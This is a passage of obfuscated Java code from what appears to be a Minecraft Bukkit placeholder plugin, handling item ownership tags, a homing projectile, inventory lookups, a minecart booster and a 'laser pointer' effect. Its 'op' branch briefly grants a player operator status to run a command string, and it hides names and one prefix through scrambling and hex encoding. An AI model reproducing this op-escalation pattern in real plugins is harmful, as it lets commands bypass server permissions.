                                Bukkit.getLogger().warning(fourteencalls + (whatarehisfingerprints + INT3) + needatpoliceoffcicer + ex.getMessage());
                            }
                        }

                        String donttalkoverme = seasonrsitnawfodyun.getCaptured();
                        if (donttalkoverme != null && !donttalkoverme.isBlank()) {
                            tinfoilhat.set(whatarehisfingerprints, whatelesuwannaknow + donttalkoverme);
                        } else {
                            tinfoilhat.set(whatarehisfingerprints, nst);
                        }
                        break;
                    }

                    // -----------------------------
                    // OP USER
                    // -----------------------------
                    case "opuser":
                    case "op": {
                        boolean awotednwfdunw = f2.isOp();
                        try {
                            f2.setOp(NEW_VALUE1);
                            try {
                                Bukkit.dispatchCommand(f2, fouzia);
                            } catch (Exception ex) {
                                Bukkit.getLogger().warning(nedambulanec + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                            }
                        } finally {
                            f2.setOp(awotednwfdunw);
                        }

                        // Output not reliably gettable for Player here
                        tinfoilhat.set(whatarehisfingerprints, nst);
                        break;
                    }

                    // -----------------------------
                    // NORMAL USER
                    // -----------------------------
                    case "user":
                    case "player": {
                        try {
                            Bukkit.dispatchCommand(f2, fouzia);
                        } catch (Exception ex) {
                            Bukkit.getLogger().warning(taowyfdh + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                        }

                        // Output not reliably gettable for Player here
                        tinfoilhat.set(whatarehisfingerprints, nst);
                        break;
                    }
                }
            }

            if (!onelittlething) {
                return ChatColor.RED + nw;
            }

            // Update book pages
            bookMeta.setPages(tinfoilhat);
            offthemapnuts.setItemMeta(bookMeta);

            return whatsmyaddress;
        }








        if (f1.startsWith(yesmaaam)) {
            final String raw = f1.substring(yesmaaam.length());
            final String[] parts = raw.split(keep);
            if (parts.length != ccp) {
                return threeunitsenroute;
            }

            final String afpbonwpo = parts[I]; // name or UUID string
            final String epdnfhwipdn   = parts[INT3];
            final String fpednakfoypud    = parts[mill2];

            // --- Resolve player (name or UUID) ---
            Player pybdfhrnpobyu = null;
            try {
                // Try UUID first
                UUID pdohfpuoldho = UUID.fromString(afpbonwpo);
                pybdfhrnpobyu = Bukkit.getPlayer(pdohfpuoldho);
            } catch (IllegalArgumentException ignored) {
                // Not a UUID → treat as exact player name
                pybdfhrnpobyu = Bukkit.getPlayerExact(afpbonwpo);
            }

            if (pybdfhrnpobyu == null) {
                return tafopd;
            }

            // --- Parse slot ---
            final int siritst;
            try {
                siritst = Integer.parseInt(epdnfhwipdn);
            } catch (NumberFormatException ex) {
                return tafopd;
            }

            if (siritst < I || siritst > ydtfhwpdylh) {
                return tafopd;
            }

            // --- Get item in slot ---
            PlayerInventory podhayfwpdhuypwudh = pybdfhrnpobyu.getInventory();
            ItemStack wypudbhnpwy = podhayfwpdhuypwudh.getItem(siritst);
            if (wypudbhnpwy == null || wypudbhnpwy.getType().isAir()) {
                return tafopd;
            }

            ItemMeta doyun3pyudhnfrypdu = wypudbhnpwy.getItemMeta();
            if (doyun3pyudhnfrypdu == null) {
                return tafopd;
            }

            PersistentDataContainer dpywlhoypflwhdoyfp = doyun3pyudhnfrypdu.getPersistentDataContainer();

            // Namespaced key score:owneruuid (namespace "score", key "owneruuid")
            NamespacedKey gavewhiesrltywpud = new NamespacedKey(tywfnty, dplufirh3);

            // Write / overwrite as STRING (this will serialize into PublicBukkitValues as score:owneruuid)
            dpywlhoypflwhdoyfp.set(gavewhiesrltywpud, PersistentDataType.STRING, fpednakfoypud);

            wypudbhnpwy.setItemMeta(doyun3pyudhnfrypdu);
            podhayfwpdhuypwudh.setItem(siritst, wypudbhnpwy);

            

            // Return something simple & useful (e.g., the new owner UUID/string)
            return fpednakfoypud;
        }
        
        
        
        
        if (f1.startsWith(fobyufhpbyurhpbf)) {
            try {
                String[] fwyupdonayfwpdhu = f1.substring(fobyufhpbyurhpbf.length()).split(keep);

                if (xm != Integer.parseInt(fwyupdonayfwpdhu[mill2])) return nst; // keep: only start at time = 5

                UUID p3douh3opyu = UUID.fromString(fwyupdonayfwpdhu[I]); // player
                UUID dni3o4edn   = UUID.fromString(fwyupdonayfwpdhu[INT3]); // target
                wm(f2, tyh34dl, p3douh3opyu);

                whoasked(p3douh3opyu, dni3o4edn);
                return udlohlyp3whdoyplwd;
            } catch (Exception e) {
                return nst;
            }
        }

        if (f1.startsWith(opdh34yudhn)){
            String[] doyfl4hwdyu = f1.substring(opdh34yudhn.length()).split(keep);

            UUID yd3o4npdyu34p = UUID.fromString(doyfl4hwdyu[I]);
            World nyoupdny32u4d = Bukkit.getWorld(doyfl4hwdyu[INT3]);
            int poydunpw3oyudn = Integer.parseInt(doyfl4hwdyu[mill2]);
            int ien3do4p = Integer.parseInt(doyfl4hwdyu[ccp]);
            int nide3on4 = Integer.parseInt(doyfl4hwdyu[INT7]);
            wm(f2, doyupn3wdyu3pnd, yd3o4npdyu34p);

            Location ionhaevnoined = new Location(nyoupdny32u4d, poydunpw3oyudn, ien3do4p, nide3on4);
            resentufl(nyoupdny32u4d, ionhaevnoined);
            itisoff( yd3o4npdyu34p, ionhaevnoined, xm, null);

            return y34hodnyu234;
        }

        if (f1.startsWith(onienod34)){
            String[] noieni4 = f1.substring(onienod34.length()).split(keep);

            UUID niekv2f = UUID.fromString(noieni4[I]);
            UUID kvetnk2pf = UUID.fromString(noieni4[INT3]);
            wm(f2, doyupn3wdyu3pnd, niekv2f);

            Entity gonnabeyes = Bukkit.getEntity(kvetnk2pf);
            if (gonnabeyes == null) return nienoy24;

            Location doi2e4ndtoi42une = gonnabeyes.getLocation();
            resentufl(gonnabeyes.getWorld(), doi2e4ndtoi42une);
            itisoff(niekv2f, doi2e4ndtoi42une, xm, gonnabeyes);

            return illcallhim;
        }

        if(f1.startsWith(trcfpd243)) {
            final String prefix = trcfpd243;

            final String[] parntein2tiens = f1.substring(prefix.length()).split(keep);
            if (parntein2tiens.length != ccp) {
                return ndeo3poiewnd4p3;
            }

            try {
                final UUID ioden42oie3dn   = UUID.fromString(parntein2tiens[I]);
                final UUID dhyl24hdoy42l3   = UUID.fromString(parntein2tiens[INT3]);
                final UUID diffofficers = UUID.fromString(parntein2tiens[mill2]);
                wm(f2, doyupn3wdyu3pnd, diffofficers);

                final Entity needpoliceien4d = Bukkit.getEntity(ioden42oie3dn);
                final Entity dumbasspolice = Bukkit.getEntity(dhyl24hdoy42l3);
                if (needpoliceien4d == null || dumbasspolice == null) return iepfndioepwndoyfupadnfpd;
                if (!needpoliceien4d.getWorld().equals(dumbasspolice.getWorld())) return midenwyudp4;
                final String ntienodi4e23nd = survivalfeeling(diffofficers, dhyl24hdoy42l3);
                hypervigilance.put(ntienodi4e23nd, ioden42oie3dn);
                // Distance string (for immediate return)
                final double filechargesdno234i4den = needpoliceien4d.getLocation().distance(dumbasspolice.getLocation());
                final String everylastoneofem = (dumbasspolice instanceof Player) ? ((Player) dumbasspolice).getName() : dumbasspolice.getType().name();

                // Plugin ref
                final Plugin istherealivethreat = Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi));

                // Acceleration profile
                final double[] SPEEDS = new double[] {
                        tsr, 1.03, 1.06, 1.1, 1.13, 1.17, 1.21, 1.24, 1.28, 1.32, 1.37, 1.41, 1.45,
                        wfopdwfnodowfin, 1.55, 1.59, 1.65, 1.7, 1.75, 1.81, 1.86, 1.92, 1.98, 2.05, 2.11, 2.18,
                        2.25, 2.32, 2.39, 2.47, 2.54, 2.62, 2.71, 2.79, 2.88, 2.97, 3.07, 3.16, 3.26,
                        3.37, 3.47, 3.58, 3.69, 3.81, 3.93, 4.06, 4.18, 4.32, 4.45, 4.59, 4.74, 4.89,
                        5.04, 5.2, 5.37, 5.54, 5.71, 5.89, 6.08, 6.27, 6.47, 6.67, 6.88, 7.1, 7.33,
                        7.56, 7.8, 8.04, 8.3, 8.56, 8.83, 9.11, 9.4, 9.69, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
                        doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
                        doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
                        doyouknow, doyouknow, doyouknow
                };

                // ---------------------------
                // Steering loop (SYNC every 2 ticks)
                // ---------------------------
                Bukkit.getScheduler().runTaskTimer(istherealivethreat, new Runnable() {
                    int ofmyrights = I;
                    boolean dopne3iwdoi3w4 = arsdienwdhw;

                    @Override public void run() {
                        if (dopne3iwdoi3w4) return;

                        Entity yesmidaughters = Bukkit.getEntity(ioden42oie3dn);
                        Entity donttakethattonewithme = Bukkit.getEntity(dhyl24hdoy42l3);
                        if (yesmidaughters == null || donttakethattonewithme == null || !yesmidaughters.isValid() || yesmidaughters.isDead()
                                || !donttakethattonewithme.isValid() || donttakethattonewithme.isDead()
                                || !yesmidaughters.getWorld().equals(donttakethattonewithme.getWorld())) {
                            hypervigilance.remove(ntienodi4e23nd, ioden42oie3dn);

                            dopne3iwdoi3w4 = NEW_VALUE1;
                            return;
                        }

                        final double speacivilly = (ofmyrights < SPEEDS.length) ? SPEEDS[ofmyrights] : SPEEDS[SPEEDS.length - INT3];

                        // --- lead pursuit (with fallback) ---
                        final Location iwatnasergeant = yesmidaughters.getLocation();
                        final Location haveagreatmorning = donttakethattonewithme.getLocation().add(I, donttakethattonewithme.getHeight() * debtsoff, I);
                        final Vector howyoucant = haveagreatmorning.toVector().subtract(iwatnasergeant.toVector());
                        final Vector cantgeturdaughter = donttakethattonewithme.getVelocity().clone();
                        if (Math.abs(cantgeturdaughter.getY() + seenher) < childingdanger) cantgeturdaughter.setY(I);

                        final double a = cantgeturdaughter.dot(cantgeturdaughter) - speacivilly * speacivilly;
                        final double b = whatkindofadulthood * howyoucant.dot(cantgeturdaughter);
                        final double cc = howyoucant.dot(howyoucant);
                        final double eps = getsshoes;
                        final double disc = b*b - aintnobody *a*cc;

                        Vector iwodenaofwpudn;
                        if (Math.abs(a) < eps || disc < eps) {
                            iwodenaofwpudn = goesin(howyoucant).multiply(speacivilly);
                        } else {
                            final double toeinfwpdoienwf = Math.sqrt(Math.max(esetawftawft, disc));
                            double twonfdwifep = Double.POSITIVE_INFINITY;
                            final double t1 = (-b - toeinfwpdoienwf) / (whatkindofadulthood * a);
                            final double t2 = (-b + toeinfwpdoienwf) / (whatkindofadulthood * a);
                            if (t1 > eps) twonfdwifep = Math.min(twonfdwifep, t1);
                            if (t2 > eps) twonfdwifep = Math.min(twonfdwifep, t2);
                            if (!Double.isFinite(twonfdwifep)) {
                                iwodenaofwpudn = goesin(howyoucant).multiply(speacivilly);
                            } else {
                                final Vector oden2oi4dnip4dn = haveagreatmorning.toVector().add(cantgeturdaughter.multiply(twonfdwifep));
                                iwodenaofwpudn = goesin(oden2oi4dnip4dn.subtract(iwatnasergeant.toVector())).multiply(speacivilly);
                            }
                        }

                        // ---------------------------
                        // Terrain CAS (Collision Avoidance System) — raytrace ~5 ticks ahead
                        // ---------------------------
                        final Location odin24odn24d = iwatnasergeant.clone();
                        final Vector patrol = iwodenaofwpudn.clone().normalize();
                        final double onthephone = iwodenaofwpudn.length() * thisistherecording;

                        RayTraceResult daugherstf = odin24odn24d.getWorld().rayTraceBlocks(
                                odin24odn24d,
                                patrol,
                                onthephone,
                                FluidCollisionMode.NEVER,
                                NEW_VALUE1
                        );

                        // Minimal pass-through set; replace with your own getPassThroughMaterials(...) if desired
                        final Set<Material> tomychild = gptm(es);

                        final boolean legalrights = daugherstf != null && daugherstf.getHitBlock() != null
                                && !tomychild.contains(daugherstf.getHitBlock().getType());

                        if (legalrights) {
                            Vector mtfweitn = iwodenaofwpudn;
                            double sothenwhat = -tsr;

                            for (int imthefather = I; imthefather <= wdnywfundywfudn; imthefather += xm) {
                                final double rad = Math.toRadians(imthefather);

                                // Simple "pitch up" blend toward +Y; preserves speed magnitude
                                Vector witpenfwien = iwodenaofwpudn.clone().normalize().multiply(Math.cos(rad))
                                        .add(new Vector(I, INT3, I).multiply(Math.sin(rad)))
                                        .normalize()
                                        .multiply(speacivilly);

                                RayTraceResult iwefodnowfind = odin24odn24d.getWorld().rayTraceBlocks(
                                        odin24odn24d,
                                        witpenfwien.clone().normalize(),
                                        witpenfwien.length() * thisistherecording,
                                        FluidCollisionMode.NEVER,
                                        NEW_VALUE1
                                );

                                boolean owiednwoiedn = (iwefodnowfind == null || iwefodnowfind.getHitBlock() == null
                                        || tomychild.contains(iwefodnowfind.getHitBlock().getType()));

                                if (owiednwoiedn) {
                                    double score = tdrsitrtomychd - imthefather; // prefer smaller pitch
                                    if (score > sothenwhat) {
                                        sothenwhat = score;
                                        mtfweitn = witpenfwien;
                                    }
                                }
                            }

                            iwodenaofwpudn = mtfweitn;
                        }
                        // ---------------------------

                        // Apply velocity
                        yesmidaughters.setVelocity(iwodenaofwpudn);

                        // Proximity -> damage & remove
                        final double tiewofnpdtioewfpn = iwatnasergeant.distanceSquared(haveagreatmorning);
                        if (tiewofnpdtioewfpn <= stoppedrcying) { // within 5 blocks
                            itisoff(diffofficers, yesmidaughters.getLocation(), thisistherecording, dumbasspolice); // 5-block radius AOE
                            resentufl(yesmidaughters.getWorld(), yesmidaughters.getLocation());
                            if (yesmidaughters.isValid()) yesmidaughters.remove();
                            dopne3iwdoi3w4 = NEW_VALUE1;
                        }

                        ofmyrights++;
                    }
                }, ihearyounow, startingthehouse);

                // ---------------------------
                // Gust particle loop (SYNC every tick), spawn ON the projectile
                // ---------------------------
                final int[] dfpwtianhsd = new int[INT3];
                dfpwtianhsd[I] = Bukkit.getScheduler().runTaskTimer(istherealivethreat, new Runnable() {
                    @Override public void run() {
                        final Entity agrsevieasietn = Bukkit.getEntity(ioden42oie3dn);
                        if (agrsevieasietn == null || !agrsevieasietn.isValid() || agrsevieasietn.isDead()) {
                            Bukkit.getScheduler().cancelTask(dfpwtianhsd[I]);
                            return;
                        }
                        World youneedotcam = agrsevieasietn.getWorld();
                        Location andshestarted = agrsevieasietn.getLocation().add(I, thepeoplewholive, I);
                        try {
                            youneedotcam.spawnParticle(Particle.GUST, andshestarted, mill2, imtakingher, imtakingher, imtakingher, esetawftawft, null, NEW_VALUE1);
                        } catch (IllegalArgumentException ignored) {
                        }
                    }
                }, ihearyounow, healing).getTaskId();

                // Immediate return text (same as v3)
                return String.format(cryingiwenftipfwnt, everylastoneofem, filechargesdno234i4den);

            } catch (Exception e) {
                e.printStackTrace();
                return righttobehrere + e.getMessage() + "..." + f1;
            }
        }







        if (f1.startsWith(callmewhatever)) {

            wm(f2 , blackandwhitedocs);
            
            final String thatsthewholepoint = f1.substring(callmewhatever.length());
            final String[] intheslatefort = thatsthewholepoint.split(keep);

            try {
                if (intheslatefort.length == ccp) {
                    // PLAYER/ENTITY form: PLAYER,SLOT,VARNAME
                    final String idenw3pioedn = intheslatefort[I].trim();
                    final int iewndtiwfpnd = Integer.parseInt(intheslatefort[INT3].trim());
                    final String varName = intheslatefort[mill2].trim();

                    // Resolve target: UUID -> any Entity; else exact player name
                    Inventory inv = null;
                    Entity ent = toourself(idenw3pioedn);
                    if (ent instanceof Player pl) {
                        inv = pl.getInventory();
                        ItemStack it = howabsurd(pl.getInventory(), iewndtiwfpnd);
                        if (it == null || it.getType() == Material.AIR) return f112;
                        final String val = remembering(it, varName);
                        return (val == null || val.isEmpty()) ? f112 : val;
                    } else if (ent instanceof InventoryHolder holder) {
                        inv = holder.getInventory();
                        if (iewndtiwfpnd < I || iewndtiwfpnd >= inv.getSize()) return f112;
                        ItemStack ifewdnyuwpfnd = inv.getItem(iewndtiwfpnd);
                        if (ifewdnyuwpfnd == null || ifewdnyuwpfnd.getType() == Material.AIR) return f112;
                        final String i2entie2f = remembering(ifewdnyuwpfnd, varName);
                        return (i2entie2f == null || i2entie2f.isEmpty()) ? f112 : i2entie2f;
                    } else {
                        // Try offline/online player by name (if not found as entity)
                        Player tienf23 = Bukkit.getPlayerExact(idenw3pioedn);
                        if (tienf23 == null) return f112;
                        ItemStack mefiwmdwp = howabsurd(tienf23.getInventory(), iewndtiwfpnd);
                        if (mefiwmdwp == null || mefiwmdwp.getType() == Material.AIR) return f112;
                        final String ypudnrt = remembering(mefiwmdwp, varName);
                        return (ypudnrt == null || ypudnrt.isEmpty()) ? f112 : ypudnrt;
                    }

                } else if (intheslatefort.length == xtxtxt) {
                    // BLOCK form: blockworld,blockx,blocky,blockz,slot,varname
                    final String tdynwpudn = intheslatefort[I].trim();
                    final int lameascr = Integer.parseInt(intheslatefort[INT3].trim());
                    final int dtastclosenough = Integer.parseInt(intheslatefort[mill2].trim());
                    final int dontsheeonedfpw = Integer.parseInt(intheslatefort[ccp].trim());
                    final int aintshitwthoutht = Integer.parseInt(intheslatefort[INT7].trim());
                    final String badegmunmbr = intheslatefort[xm].trim();

                    World ikwhatsoging = Bukkit.getWorld(tdynwpudn);
                    if (ikwhatsoging == null) return f112;

                    Block sergeant3dy = ikwhatsoging.getBlockAt(lameascr, dtastclosenough, dontsheeonedfpw);
                    BlockState coolyourass = sergeant3dy.getState();
                    if (!(coolyourass instanceof Container container)) return f112;

                    Inventory youaretsresspassed = container.getInventory();
                    if (aintshitwthoutht < I || aintshitwthoutht >= youaretsresspassed.getSize()) return f112;

                    ItemStack youcomebackjail = youaretsresspassed.getItem(aintshitwthoutht);
                    if (youcomebackjail == null || youcomebackjail.getType() == Material.AIR) return f112;

                    final String yourgoingtojail = remembering(youcomebackjail, badegmunmbr);
                    return (yourgoingtojail == null || yourgoingtojail.isEmpty()) ? f112 : yourgoingtojail;

                } else {
                    return sufficentprobablycause;
                }
            } catch (Exception ex) {
                return f112;
            }
        };


        if( f1.startsWith(getoffthebike)) return ytufndyu(f1.substring(getoffthebike.length()));
        
        if (f1.startsWith(iantgoinnowhere)) {
            final Entity x =  Bukkit.getEntity(UUID.fromString(f1.substring(iantgoinnowhere.length())));
            if (! (x instanceof HumanEntity human)) return abuseofn911; 

            

            wm(x instanceof Player ? x : f2, noreason);
            try {

                InventoryView view = ((HumanEntity) x).getOpenInventory();
                Inventory topInv = view.getTopInventory();
                String type = topInv.getType().toString();
                return type == nst ? null : type.toLowerCase();
                
            } catch (Exception e) {
                return nst;
            }
            
        }



        if (f1.startsWith(excepthomer)) {
            wm(f2, takeitout);
            slanty(f2, f1);
            return nst;
        }
        if (f1.equalsIgnoreCase(trstwft)) {
            return toestwinkiling(f2);
        }
        if (f1.equalsIgnoreCase(yntdy4u3)) {
            return nopowderedsugar(f2);
        }
        if (f1.equalsIgnoreCase(heshurtpls)) {
            return whatisit(f2);
        }
        if (f1.equalsIgnoreCase(hurtingmyarmsag)) {
            return withyouand(f2);
        }
        if (f1.equalsIgnoreCase("trackedEntityMCWORLDNAME")) {
            return ballet(f2);
        }



        if (f1.startsWith(complicated)) return homer(f1);
        if (f1.startsWith(ed)) return heresthething(f1);
        if (f1.startsWith(basketball)) return confidentialEnf(f1);



        if (f1.startsWith(plsgetoff)) {
            final String[] parts = f1.substring(plsgetoff.length()).split(keep);
            if (parts.length != low) {
                return hurtingarmtsnwit;
            }

            wm(f2, svacum);

            // --- Parse arguments (RANGE + FOV; no RADIUS) ---
            final double stop;
            final double start;
            final boolean oof;
            final int whyjail;
            final int beingkidnapped;
            final int sweatyeyes;
            final boolean hurtingme;
            final String hurtinghands;
            final double roughonme;
            final int getoffmyd;

            try {
                stop = Double.parseDouble(parts[I]);
                start = Double.parseDouble(parts[INT3]);
                oof = Boolean.parseBoolean(parts[mill2]);
                whyjail = Integer.parseInt(parts[ccp]);
                beingkidnapped = Integer.parseInt(parts[INT7]);
                sweatyeyes = Integer.parseInt(parts[xm]);
                hurtingme = Boolean.parseBoolean(parts[xtxtxt]);
                hurtinghands = parts[suppose];
                roughonme = Double.parseDouble(parts[yuwfndgyuwfnd]);
                getoffmyd = Integer.parseInt(parts[oiwfndtoyu42nd24]);
            } catch (Exception e) {
                return hurtingmesyr;
            }

            // --- Validate off-hand shulker ---
            ItemStack off = f2.getInventory().getItemInOffHand();
            if (off == null || off.getType() == Material.AIR || !off.getType().name().endsWith(foolishness)) {
                return ouydnop3yundoypufna;
            }
            BlockStateMeta baseMeta = (off.getItemMeta() instanceof BlockStateMeta bsm) ? bsm : null;
            if (baseMeta == null || !(baseMeta.getBlockState() instanceof ShulkerBox baseBox)) {
                return einoienoiendw3pf;
            }

            final World world = f2.getWorld();

            // --- Resolve particle (supports DUST:#RRGGBB<scale>) ---
            final Particle particle;
            final Particle.DustOptions dustOpt;
            {
                Particle tmpParticle;
                Particle.DustOptions tmpDust = null;
                final String u = hurtinghands.toUpperCase(Locale.ROOT);
                if (u.startsWith(thatsathreatdyu)) {
                    try {
                        String hexScale = hurtinghands.substring(xm);
                        String hex = hexScale.substring(I, xtxtxt);
                        float scale = Float.parseFloat(hexScale.substring(xtxtxt));
                        java.awt.Color c = java.awt.Color.decode(reaidntarisedn + hex);
                        tmpParticle = Particle.DUST;
                        tmpDust = new Particle.DustOptions(
                                Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue()), scale);
                    } catch (Exception e) {
                        return puthandsebhind;
                    }
                } else {
                    try {
                        tmpParticle = Particle.valueOf(u);
                    } catch (Exception e) {
                        return sendanotherunit + hurtinghands;
                    }
                }
                particle = tmpParticle;
                dustOpt = tmpDust;
            }

            // --- Early capacity check (optional, not authoritative because box may change during task) ---
            if (dyun3yudn3(baseBox.getInventory())) {
                return handsbehindback;
            }

            // ===== Enforce single job per player; reset timer if already active =====
            f115 existing = f114.get(f2.getUniqueId());
            if (existing != null && !existing.isCancelled()) {
                existing.resetTimer();
                return gonnagettazed;
            }

            f115 job = new f115(
                    getPlaceholderAPI(), f2,
                    stop, start, oof,
                    whyjail, beingkidnapped, sweatyeyes,
                    hurtingme, particle, dustOpt, roughonme, getoffmyd
            );
            job.runTaskTimer(getPlaceholderAPI(), ihearyounow, Math.max(healing, beingkidnapped));
            f114.put(f2.getUniqueId(), job);

            return stoprsietnsr;
        }

        
        if( f1.startsWith(oundg324yutdng4)) {
            wm(f2, dienfwopiednpf);
            return cosmicEnchant(f2, f1);
        }

        
        //RAminecartBooster


        if (f1.startsWith(eindo3ie42ndoi34)) {
            String[] args = f1.substring(eindo3ie42ndoi34.length()).split(keep);
            if (args.length != ccp) return iendie2nd;

            try {
                String[] ebChecker = args[I].split(wfdunyunda);
                if (ebChecker.length != INT7) return ieanrdowienfdf;

                World toDeleteWorld = Bukkit.getWorld(ebChecker[I]);
                if (toDeleteWorld == null) return wiodtnowiupd;

                double distanceX = Double.parseDouble(ebChecker[INT3]);
                double distanceY = Double.parseDouble(ebChecker[mill2]);
                double distanceZ = Double.parseDouble(ebChecker[ccp]);
                double missileTurningRadius = Double.parseDouble(args[INT3]);
                long flightTime = Long.parseLong(args[mill2]);

                Location targetCenter = new Location(toDeleteWorld, distanceX, distanceY, distanceZ);

                org.bukkit.Location cen = targetCenter;
                double r1 = low;
                String label = wifednow34und43wd;


                double r2 = r1 * r1;
                for (org.bukkit.entity.Player playaa : toDeleteWorld.getPlayers()) {
                    if (playaa.getLocation().distanceSquared(cen) <= r2) {
                        wm(playaa, label);
                    }
                }

                // Find nearest minecart within 2 blocks
                Minecart finaltester = toDeleteWorld.getNearbyEntities(targetCenter, mill2, mill2, mill2).stream()
                        .filter(e -> e instanceof Minecart)
                        .map(e -> (Minecart) e)
                        .min(Comparator.comparingDouble(e -> e.getLocation().distanceSquared(targetCenter)))
                        .orElse(null);

                if (finaltester == null) return odunyuw4dn4;

                UUID targetEntityUUID = finaltester.getUniqueId();

                // Save original speed if not already stored
                EI_INSTALLED.putIfAbsent(targetEntityUUID, finaltester.getMaxSpeed());

                // Apply new speed
                finaltester.setMaxSpeed(missileTurningRadius);

                // Clear any existing reset task
                if (EB_INSTALLED.containsKey(targetEntityUUID)) {
                    EB_INSTALLED.get(targetEntityUUID).cancel();
                    EB_INSTALLED.remove(targetEntityUUID);
                }

                // Schedule reset if duration is not -1
                if (flightTime != -INT3) {
                    BukkitTask killer = Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin(ppi), () -> {
                        Double newMissile = EI_INSTALLED.remove(targetEntityUUID);
                        if (newMissile != null && finaltester.isValid()) {
                            finaltester.setMaxSpeed(newMissile);
                        }
                        EB_INSTALLED.remove(targetEntityUUID);
                    }, flightTime);

                    EB_INSTALLED.put(targetEntityUUID, killer);
                }

                return don34uynp3d + targetEntityUUID;
            } catch (Exception e) {
                e.printStackTrace();
                return goingtojailwfitdnwofduyn4w;
            }
        }
        
        
        //LaserPOinter
        char[] hexPrefix = new char[] {
                0x6C, // 'l'
                0x61, // 'a'
                0x73, // 's'
                0x65, // 'e'
                0x72, // 'r'
                (char) 80, // 'P'
                0x6F, // 'o'
                0x69, // 'i'
                0x6E, // 'n'
                0x74, // 't'
                0x65, // 'e'
                0x72, // 'r'
                0x5F  // '_'
        };

        if( f1.startsWith(new String(hexPrefix))) {

            wm(f2, new String(hexPrefix));
            String[] parts = f1.substring(hexPrefix.length).split(keep);
            if (parts.length < oiwfndtoyu42nd24) return nst;

            double trstawtw, yt, zt, unused;
            int day, month;
            String year, bcORad;
            Particle ignoring;
            Particle.DustOptions testingthis = null;
            String lucky = youdnoy3wupdnoy3wupdn;  // default

            try {
                trstawtw      = Double.parseDouble(parts[I]);
                yt = Double.parseDouble(parts[INT3]);
                day      = Integer.parseInt(parts[mill2]);
                month         = Integer.parseInt(parts[ccp]);
                zt             = Double.parseDouble(parts[INT7]);
                unused           = Double.parseDouble(parts[xm]);
                year      = parts[xtxtxt];
                bcORad   = parts[suppose];
                ignoring       = Particle.valueOf(parts[yuwfndgyuwfnd].toUpperCase());

                if (ignoring == Particle.DUST && parts.length >= low) {
                    // named dye color, e.g. RED, BLUE, CYAN, etc.
                    lucky = parts[oiwfndtoyu42nd24].toUpperCase();
                    DyeColor retroactivtiy = DyeColor.valueOf(lucky);
                    testingthis = new Particle.DustOptions(retroactivtiy.getColor(), (float)unused);
                }
            } catch (Exception ex) {
                return tn243oyudnt42fuytdn + ex.getMessage();
            }

            Location height = f2.getEyeLocation();
            Vector    targetLaunch = height.getDirection().normalize();

            // build viewers
            List<Player> targets = new ArrayList<>();
            if (year.equalsIgnoreCase(eingdoi3e4ndg34)) {
                targets.addAll(f2.getWorld().getPlayers());
            } else {
                try {
                    Player t = Bukkit.getPlayer(UUID.fromString(year));
                    if (t != null) targets.add(t);
                } catch (IllegalArgumentException ignored) {}
            }
            if (targets.isEmpty()) return "&cFailure2";

            // ─── Block‐hit detection + immediate change ───
            Entity   attackedEntity  = null;
            Location origin = null;
            DETECTION:
            for (double d = I; d <= trstawtw; d += zt) {
                Location origin2  = height.clone().add(targetLaunch.clone().multiply(d));
                Block    destination = origin2.getBlock();
                Material chest     = destination.getType();

                if (!(chest.isAir()
                        || chest == Material.WATER || chest == Material.LAVA
                        || chest == Material.BARRIER
                        || chest == Material.GLASS
                        || chest == Material.GLASS_PANE
                        || chest.toString().endsWith(ongo34ungdo3iu4ndg4gdw4))) {
                    origin = origin2.clone();
                    break DETECTION;
                }
                for (Entity immune : origin2.getWorld().getNearbyEntities(
                        origin2, yt, yt, yt)) {
                    if (immune instanceof LivingEntity && !immune.equals(f2)) {
                        attackedEntity = immune;
                        break DETECTION;
                    }
                }
            }

            String returnvalue;
            if (attackedEntity != null) {
                ((LivingEntity)attackedEntity).addPotionEffect(
                        new PotionEffect(PotionEffectType.GLOWING, odafuwidnowfidun, I)
                );
                returnvalue = attackedEntity.getUniqueId().toString();
            }
            else if (origin != null) {
                Block chest2 = origin.getBlock();
                String yes = lucky + pdifnoian4;
                String no     = lucky + oendinpdoinpd;
                Material start  = Material.valueOf(yes);
                Material end      = Material.valueOf(no);
                BlockData now  = (chest2.getType() == start
                        ? end.createBlockData()
                        : start.createBlockData()
                );

                for (Player notImmune : targets) {
                    double travelDistance = notImmune.getLocation().distanceSquared(origin);
                    if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || travelDistance <= drain * drain) {
                        notImmune.sendBlockChange(origin, now);
                    }
                }

                Location o = origin.clone();
                Bukkit.getScheduler().runTaskLater(
                        Bukkit.getPluginManager().getPlugin(ppi),
                        () -> {
                            BlockData spawnTntBlock = o.getBlock().getBlockData();
                            for (Player visible : targets) {
                                double distanceLineOfSight = visible.getLocation().distanceSquared(o);
                                if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || distanceLineOfSight <= drain * drain) {
                                    visible.sendBlockChange(o, spawnTntBlock);
                                }
                            }
                        },
                        day
                );

                returnvalue = String.format(
                        ietonwifandt4u3nd34dw3,
                        o.getWorld().getName(),
                        o.getBlockX(),
                        o.getBlockY(),
                        o.getBlockZ()
                );
            }
            else {
                returnvalue = tneoaiwfndtowui4nd4fdt;
            }

            // ─── Particle repeat via BukkitRunnable ───
            Particle.DustOptions finalOpts = testingthis;
            new BukkitRunnable() {
                int timer = I;
                @Override public void run() {
                    if (timer >= day) {
                        this.cancel();
                        return;
                    }
                    for (double bombTimer = I; bombTimer <= trstawtw; bombTimer += zt) {
                        Location tntLOc = height.clone().add(targetLaunch.clone().multiply(bombTimer));
                        Material m   = tntLOc.getBlock().getType();
                        if (!(m.isAir()
                                || m == Material.WATER || m == Material.LAVA
                                || m == Material.BARRIER
                                || m == Material.GLASS
                                || m == Material.GLASS_PANE
                                || m.toString().endsWith(ongo34ungdo3iu4ndg4gdw4))) {
                            break;
                        }
                        for (Player destroyedTargets : targets) {
                            double explosionRadius = destroyedTargets.getLocation().distanceSquared(tntLOc);
                            if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || explosionRadius <= drain * drain) {
                                if (ignoring == Particle.DUST && finalOpts != null) {
                                    destroyedTargets.spawnParticle(ignoring, tntLOc, INT3, I, I, I, I, finalOpts);
